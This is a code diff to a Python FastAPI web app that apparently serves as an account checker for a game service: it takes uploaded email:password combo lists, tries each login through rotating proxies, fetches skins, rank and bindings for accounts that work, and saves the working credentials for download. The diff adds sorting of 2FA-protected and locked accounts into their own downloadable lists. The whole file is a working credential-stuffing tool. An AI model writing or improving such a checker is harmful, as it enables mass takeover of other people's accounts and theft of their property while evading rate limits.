@@ -9,13 +9,22 @@ app = FastAPI()
 app.mount("/static", StaticFiles(directory="static"), name="static")
 templates = Jinja2Templates(directory="templates")
 
-results = {"total": 0, "working": 0, "invalid": 0, "valid_accounts": []}
+results = {
+    "total": 0,
+    "working": 0,
+    "invalid": 0,
+    "2fa_required": 0,
+    "locked": 0,
+    "valid_accounts": [],
+    "2fa_accounts": [],
+    "locked_accounts": [],
+}
 
-# Load proxies from proxies.txt
+# Load proxies
 with open("proxies.txt", "r") as f:
     proxies = [p.strip() for p in f if p.strip()]
 
-# Correct proxy formatter
+# Proxy formatter
 def get_proxy_url():
     raw = random.choice(proxies)
     ip, port, user, pwd = raw.split(":")
@@ -31,9 +40,9 @@ async def get_profile(access_token, user_id):
     headers = {"Authorization": f"Bearer {access_token}"}
     data = {"user_id": user_id, "format": 2}
 
-    async with await get_async_client() as client:
-        for _ in range(3):  # Retry up to 3 times
-            try:
+    for _ in range(3):
+        try:
+            async with await get_async_client() as client:
                 res = await client.post(url, data=data, headers=headers)
                 if res.status_code == 200:
                     info = res.json().get("data", {})
@@ -41,10 +50,10 @@ async def get_profile(access_token, user_id):
                     rank = info.get("rank_name", "Unknown")
                     bindings = [b.get("bind_type", "Unknown") for b in info.get("bind_list", [])]
                     return total_skins, rank, bindings
-            except Exception:
-                print("Error fetching profile, retrying...")
-                traceback.print_exc()
-                await asyncio.sleep(1)
+        except Exception:
+            print("Error fetching profile, retrying...")
+            traceback.print_exc()
+            await asyncio.sleep(1)
     return 0, "Unknown", []
 
 async def check_account(email, password):
@@ -52,35 +61,56 @@ async def check_account(email, password):
     data = {"email": email, "password": password, "os_type": 2, "format": 2, "secret": ""}
     headers = {"Content-Type": "application/x-www-form-urlencoded"}
 
-    async with await get_async_client() as client:
-        for _ in range(3):  # Retry up to 3 times
-            try:
+    for _ in range(3):
+        try:
+            async with await get_async_client() as client:
                 res = await client.post(login_url, data=data, headers=headers)
-                if res.status_code == 200 and res.json().get("code") == 200:
-                    results["total"] += 1
-                    access_token = res.json()["data"]["access_token"]
-                    user_id = res.json()["data"]["user_id"]
-                    skins, rank, bindings = await get_profile(access_token, user_id)
-                    account_info = {
-                        "email": email,
-                        "password": password,
-                        "skins": skins,
-                        "rank": rank,
-                        "bindings": ", ".join(bindings),
-                    }
-                    results["working"] += 1
-                    results["valid_accounts"].append(account_info)
-                    print(f"[+] Valid account: {email}")
-                    return "working"
+                results["total"] += 1
+                if res.status_code == 200:
+                    resp_json = res.json()
+                    code = resp_json.get("code")
+
+                    if code == 200:
+                        access_token = resp_json["data"]["access_token"]
+                        user_id = resp_json["data"]["user_id"]
+                        skins, rank, bindings = await get_profile(access_token, user_id)
+                        account_info = {
+                            "email": email,
+                            "password": password,
+                            "skins": skins,
+                            "rank": rank,
+                            "bindings": ", ".join(bindings),
+                        }
+                        results["working"] += 1
+                        results["valid_accounts"].append(account_info)
+                        print(f"[+] Valid account: {email}")
+                        return "working"
+
+                    elif code == 403:
+                        results["2fa_required"] += 1
+                        results["2fa_accounts"].append({"email": email, "password": password})
+                        print(f"[!] 2FA required: {email}")
+                        return "2fa_required"
+
+                    elif code == 423:
+                        results["locked"] += 1
+                        results["locked_accounts"].append({"email": email, "password": password})
+                        print(f"[-] Account locked/banned: {email}")
+                        return "locked"
+
+                    else:
+                        results["invalid"] += 1
+                        print(f"[-] Invalid account (code {code}): {email}")
+                        return "invalid"
+
                 else:
-                    results["total"] += 1
+                    print(f"[-] HTTP error {res.status_code} for {email}")
                     results["invalid"] += 1
-                    print(f"[-] Invalid account: {email}")
                     return "invalid"
-            except Exception:
-                print("Error checking account, retrying...")
-                traceback.print_exc()
-                await asyncio.sleep(1)
+        except Exception:
+            print("Error checking account, retrying...")
+            traceback.print_exc()
+            await asyncio.sleep(1)
     return "error"
 
 @app.get("/", response_class=HTMLResponse)
@@ -96,7 +126,6 @@ async def upload(file: UploadFile):
             email, password = line.strip().split(":", 1)
             accounts.append((email, password))
 
-    # Limit concurrency to avoid server crash (example: 20 accounts at once)
     semaphore = asyncio.Semaphore(20)
 
     async def limited_check(email, password):
@@ -113,5 +142,12 @@ async def manual(email: str = Form(...), password: str = Form(...)):
     return JSONResponse({"status": status, **results})
 
 @app.get("/download")
-async def download():
-    return JSONResponse({"working": results["valid_accounts"]})
+async def download(type: str = "working"):
+    if type == "working":
+        return JSONResponse({"working": results["valid_accounts"]})
+    elif type == "2fa":
+        return JSONResponse({"2fa_required": results["2fa_accounts"]})
+    elif type == "locked":
+        return JSONResponse({"locked": results["locked_accounts"]})
+    else:
+        return JSONResponse({"error": "Invalid type. Use working, 2fa, or locked."})
